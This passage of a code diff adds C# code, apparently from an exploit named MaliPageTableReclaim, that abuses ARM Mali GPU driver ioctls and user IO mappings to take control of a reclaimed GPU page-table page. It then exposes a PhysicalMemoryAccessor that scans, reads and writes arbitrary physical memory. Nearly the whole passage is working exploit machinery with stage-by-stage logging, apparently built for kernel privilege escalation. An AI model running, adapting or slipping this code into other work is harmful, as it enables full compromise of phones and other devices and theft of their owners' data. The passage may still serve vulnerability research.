+                    Path.Combine(directory, "lp_mem_pool_size"));
+                break;
+            }
+        }
+        catch (Exception exception)
+        {
+            context = "error:" + exception.GetType().Name;
+            contextLarge = context;
+        }
+        Console.WriteLine(
+            "pool_state stage={0} device={1} device_lp={2} context={3} context_lp={4}",
+            stage,
+            device,
+            deviceLarge,
+            context,
+            contextLarge);
+    }
+
+    private static string ReadPoolFile(string path)
+    {
+        try
+        {
+            return File.ReadAllText(path).Trim().Replace(' ', ',');
+        }
+        catch (Exception exception)
+        {
+            return "error:" + exception.GetType().Name;
+        }
+    }
+
+    private PageTableOwner FindOwnedPageTable(
+        IntPtr secondMapping,
+        ulong[] reservedAddresses,
+        IntPtr[] reservedMappings)
+    {
+        PageTableOwner best = null;
+        int bestValidEntries = 0;
+        for (int userIoPage = 0; userIoPage < 2; userIoPage++)
+        {
+            IntPtr table = IntPtr.Add(
+                secondMapping,
+                MaliNative.PageSize * (1 + userIoPage));
+            int validEntries = 0;
+            for (int entryIndex = 0; entryIndex < PageTableEntries; entryIndex++)
+            {
+                if (IsValidPageEntry(ReadEntry(table, entryIndex)))
+                {
+                    validEntries++;
+                }
+            }
+            Console.WriteLine(
+                "user_io_page_summary page={0} valid_entries={1}",
+                userIoPage,
+                validEntries);
+            for (int region = 0; region < reservedAddresses.Length; region++)
+            {
+                int startIndex = (int)((reservedAddresses[region] >> 12) & 0x1ffUL);
+                if (startIndex + ReservedScanPages > PageTableEntries)
+                {
+                    continue;
+                }
+                bool validRun = true;
+                for (int page = 0; page < ReservedInitialCommitPages; page++)
+                {
+                    if (!IsValidPageEntry(ReadEntry(table, startIndex + page)))
+                    {
+                        validRun = false;
+                        break;
+                    }
+                }
+                if (validRun)
+                {
+                    if (validEntries > bestValidEntries)
+                    {
+                        bestValidEntries = validEntries;
+                        best = new PageTableOwner
+                        {
+                            TableAddress = table,
+                            UserIoPage = userIoPage,
+                            RegionIndex = region,
+                            StartIndex = startIndex,
+                            GpuAddress = reservedAddresses[region],
+                            CpuMapping = reservedMappings[region],
+                        };
+                    }
+                    break;
+                }
+            }
+        }
+        if (best != null)
+        {
+            Console.WriteLine(
+                "page_table_candidate_selected user_io_page={0} valid_entries={1}",
+                best.UserIoPage,
+                bestValidEntries);
+            return best;
+        }
+        throw new InvalidOperationException(
+            "reclaimed page-table page did not match a reserved region");
+    }
+
+    private static ulong ReadEntry(IntPtr table, int index)
+    {
+        return unchecked((ulong)Marshal.ReadInt64(table, index * sizeof(ulong)));
+    }
+
+    private static bool IsValidPageEntry(ulong entry)
+    {
+        return (entry & PageTableValidMask) == PageTableValidMask;
+    }
+
+    private static void FlushPageTable(IntPtr table, string operation)
+    {
+        int result = MaliNative.Msync(
+            table,
+            new UIntPtr(MaliNative.PageSize),
+            MaliNative.MsSync);
+        Console.WriteLine(
+            "{0}_msync result={1} errno={2}",
+            operation,
+            result,
+            result < 0 ? Marshal.GetLastWin32Error() : 0);
+    }
+
+    private static void FlushMapping(IntPtr mapping, string operation)
+    {
+        int result = MaliNative.Msync(
+            mapping,
+            new UIntPtr(MaliNative.PageSize),
+            MaliNative.MsSync);
+        Console.WriteLine(
+            "{0}_msync result={1} errno={2}",
+            operation,
+            result,
+            result < 0 ? Marshal.GetLastWin32Error() : 0);
+    }
+
+    private static List<ulong> UniqueTwoMegabyteBases(
+        ulong[] addresses,
+        int requiredStartIndex)
+    {
+        List<ulong> result = new List<ulong>();
+        foreach (ulong address in addresses)
+        {
+            int startIndex = (int)((address >> 12) & 0x1ffUL);
+            if (startIndex != requiredStartIndex)
+            {
+                continue;
+            }
+            ulong candidate = address & TwoMegabyteMask;
+            if (!result.Contains(candidate))
+            {
+                result.Add(candidate);
+            }
+        }
+        return result;
+    }
+
+    private static int FindRegion(
+        ulong[] addresses,
+        ulong requiredBase,
+        int requiredStartIndex)
+    {
+        for (int index = 0; index < addresses.Length; index++)
+        {
+            ulong address = addresses[index];
+            int startIndex = (int)((address >> 12) & 0x1ffUL);
+            if ((address & TwoMegabyteMask) == requiredBase
+                && startIndex == requiredStartIndex)
+            {
+                return index;
+            }
+        }
+        return -1;
+    }
+
+    private static int CountRegionsTouchingBase(
+        ulong[] addresses,
+        ulong requiredBase)
+    {
+        int count = 0;
+        ulong tableEnd = requiredBase + (1UL << 21);
+        foreach (ulong address in addresses)
+        {
+            ulong regionEnd = address
+                + ((ulong)ReservedInitialCommitPages * MaliNative.PageSize);
+            if (address < tableEnd && regionEnd > requiredBase)
+            {
+                count++;
+            }
+        }
+        return count;
+    }
+
+    private void CommitRegion(ulong gpuAddress, ulong pages, string operation)
+    {
+        MaliNative.MemCommit request = new MaliNative.MemCommit
+        {
+            GpuAddress = gpuAddress,
+            Pages = pages,
+        };
+        MaliNative.RequireSuccess(
+            operation,
+            MaliNative.IoctlMemCommit(
+                fileDescriptor,
+                MaliNative.KbaseIoctlMemCommit,
+                ref request));
+    }
+
+    private byte CreateGroup(string operation)
+    {
+        MaliNative.QueueGroupCreate request = new MaliNative.QueueGroupCreate();
+        MaliNative.RequireSuccess(
+            operation,
+            MaliNative.IoctlQueueGroupCreate(
+                fileDescriptor,
+                MaliNative.KbaseIoctlCsQueueGroupCreate,
+                ref request));
+        return (byte)(request.TilerMaskOrOutput & 0xff);
+    }
+
+    private ulong BindQueue(ulong queueGpuAddress, byte group, string operation)
+    {
+        MaliNative.QueueBind request = new MaliNative.QueueBind
+        {
+            BufferGpuAddressOrMmapHandle = queueGpuAddress,
+            GroupHandleAndCsiIndex = group,
+        };
+        MaliNative.RequireSuccess(
+            operation,
+            MaliNative.IoctlQueueBind(
+                fileDescriptor,
+                MaliNative.KbaseIoctlCsQueueBind,
+                ref request));
+        return request.BufferGpuAddressOrMmapHandle;
+    }
+
+    private IntPtr MapUserIo(ulong handle, string operation)
+    {
+        IntPtr mapping = MaliNative.Mmap(
+            IntPtr.Zero,
+            new UIntPtr(MaliNative.UserIoMappingSize),
+            MaliNative.ProtectRead | MaliNative.ProtectWrite,
+            MaliNative.MapShared,
+            fileDescriptor,
+            unchecked((long)handle));
+        if (mapping == new IntPtr(-1))
+        {
+            throw new InvalidOperationException(
+                string.Format("{0} failed errno={1}", operation, Marshal.GetLastWin32Error()));
+        }
+        Console.WriteLine("{0}=0x{1:x}", operation, MaliNative.PointerValue(mapping));
+        return mapping;
+    }
+
+    private void TerminateGroup(byte group, string operation)
+    {
+        MaliNative.QueueGroupTerminate request = new MaliNative.QueueGroupTerminate
+        {
+            GroupHandle = group,
+        };
+        MaliNative.RequireSuccess(
+            operation,
+            MaliNative.IoctlQueueGroupTerminate(
+                fileDescriptor,
+                MaliNative.KbaseIoctlCsQueueGroupTerminate,
+                ref request));
+    }
+
+    private static MaliNative.MemAlloc NewAllocation(ulong pages, bool sameVa)
+    {
+        return NewAllocation(pages, pages, sameVa);
+    }
+
+    private static MaliNative.MemAlloc NewAllocation(
+        ulong vaPages,
+        ulong commitPages,
+        bool sameVa)
+    {
+        return new MaliNative.MemAlloc
+        {
+            VaPagesOrFlags = vaPages,
+            CommitPagesOrGpuVa = commitPages,
+            Extension = 0,
+            Flags = MaliNative.BaseMemProtCpuRead
+                | MaliNative.BaseMemProtCpuWrite
+                | MaliNative.BaseMemProtGpuRead
+                | MaliNative.BaseMemProtGpuWrite
+                | (sameVa ? MaliNative.BaseMemSameVa : 0),
+        };
+    }
+
+    private sealed class PageTableOwner
+    {
+        internal IntPtr TableAddress;
+        internal int UserIoPage;
+        internal int RegionIndex;
+        internal int StartIndex;
+        internal ulong GpuAddress;
+        internal IntPtr CpuMapping;
+    }
+
+    internal sealed class ControlledTable
+    {
+        internal IntPtr TableAddress;
+        internal ulong BaseAddress;
+        internal int FirstIndex;
+        internal int PageCount;
+        internal int RefreshRegionIndex;
+        internal List<int> RegionIndices;
+        internal ulong[] ReservedAddresses;
+
+        internal ulong VirtualAddress
+        {
+            get
+            {
+                return BaseAddress + ((ulong)FirstIndex * MaliNative.PageSize);
+            }
+        }
+    }
+
+    internal sealed class PhysicalMemoryAccessor
+    {
+        private readonly MaliPageTableReclaim reclaim;
+        private readonly EglComputeContext compute;
+        private readonly ControlledTable controlled;
+
+        internal PhysicalMemoryAccessor(
+            MaliPageTableReclaim reclaim,
+            EglComputeContext compute,
+            ControlledTable controlled)
+        {
+            this.reclaim = reclaim;
+            this.compute = compute;
+            this.controlled = controlled;
+        }
+
+        internal ulong FindPatternRange(
+            uint encodedNeedle0,
+            uint encodedNeedle1,
+            uint encodedNeedle2,
+            uint encodedNeedle3,
+            ulong start,
+            ulong end)
+        {
+            if (start >= end
+                || (start & (MaliNative.PageSize - 1)) != 0
+                || (end & (MaliNative.PageSize - 1)) != 0)
+            {
+                throw new ArgumentOutOfRangeException("physical scan range");
+            }
+            return reclaim.FindPhysicalPattern(
+                compute,
+                controlled,
+                encodedNeedle0,
+                encodedNeedle1,
+                encodedNeedle2,
+                encodedNeedle3,
+                delegate { },
+                new[] { new PhysicalRange(start, end) });
+        }
+
+        internal ulong FindPattern(
+            uint encodedNeedle0,
+            uint encodedNeedle1,
+            uint encodedNeedle2,
+            uint encodedNeedle3,
+            Action beforeScan)
+        {
+            return reclaim.FindPhysicalPattern(
+                compute,
+                controlled,
+                encodedNeedle0,
+                encodedNeedle1,
+                encodedNeedle2,
+                encodedNeedle3,
+                beforeScan,
+                InitialScanRanges);
+        }
+
+        internal ulong FindPatternAfter(
+            uint encodedNeedle0,
+            uint encodedNeedle1,
+            uint encodedNeedle2,
+            uint encodedNeedle3,
+            ulong physicalAddress)
+        {
+            ulong nextPage = (physicalAddress
+                & ~((ulong)MaliNative.PageSize - 1))
+                + MaliNative.PageSize;
+            List<PhysicalRange> ranges = new List<PhysicalRange>();
+            foreach (PhysicalRange range in InitialScanRanges)
+            {
+                ulong start = nextPage > range.Start ? nextPage : range.Start;
+                if (start < range.End)
+                {
+                    ranges.Add(new PhysicalRange(start, range.End));
+                }
+            }
+            if (ranges.Count == 0)
+            {
+                return ulong.MaxValue;
+            }
+            return reclaim.FindPhysicalPattern(
+                compute,
+                controlled,
+                encodedNeedle0,
+                encodedNeedle1,
+                encodedNeedle2,
+                encodedNeedle3,
+                delegate { },
+                ranges.ToArray());
+        }
+
+        internal uint[] ReadWords(ulong physicalAddress, int count)
+        {
+            if ((physicalAddress & (sizeof(uint) - 1)) != 0 || count < 0)
+            {
+                throw new ArgumentOutOfRangeException("physical word range");
+            }
+            uint[] words = new uint[count];
+            int completed = 0;
+            while (completed < count)
+            {
+                ulong current = physicalAddress
+                    + ((ulong)completed * sizeof(uint));
+                int pageWords = (int)(
+                    (MaliNative.PageSize
+                        - (current & (MaliNative.PageSize - 1)))
+                    / sizeof(uint));
+                int take = Math.Min(count - completed, pageWords);
+                int outputOffset = completed;
+                WithPage(
+                    current,
+                    delegate(ulong gpuAddress)
+                    {
+                        for (int index = 0; index < take; index++)
+                        {
+                            words[outputOffset + index] = compute.Read32(
+                                gpuAddress + ((ulong)index * sizeof(uint)));
+                        }
+                        return true;
+                    });
+                completed += take;
+            }
+            return words;
+        }
+
+        internal uint[] WriteWords(ulong physicalAddress, uint[] values)
+        {
+            if (values == null)
+            {
+                throw new ArgumentNullException("values");
+            }
+            ulong pageOffset = physicalAddress & (MaliNative.PageSize - 1);
+            if ((physicalAddress & (sizeof(uint) - 1)) != 0
+                || pageOffset + ((ulong)values.Length * sizeof(uint))
+                    > MaliNative.PageSize)
+            {
+                throw new ArgumentOutOfRangeException("physical word range");
+            }
+            return WithPage(
+                physicalAddress,
+                delegate(ulong gpuAddress)
+                {
+                    uint[] observed = new uint[values.Length];
+                    for (int index = 0; index < values.Length; index++)
+                    {
+                        observed[index] = compute.Write32(
+                            gpuAddress + ((ulong)index * sizeof(uint)),
+                            values[index]);
+                    }
+                    return observed;
+                });
+        }
+
+        internal T WithPage<T>(
+            ulong physicalAddress,
+            Func<ulong, T> action)
+        {
+            return reclaim.WithPhysicalPage(
+                compute,
+                controlled,
+                physicalAddress,
+                action);
+        }
+    }
+
+    private struct PhysicalRange
+    {
+        internal readonly ulong Start;
+        internal readonly ulong End;
+
+        internal PhysicalRange(ulong start, ulong end)
+        {
+            Start = start;
+            End = end;
+        }
+    }
+}
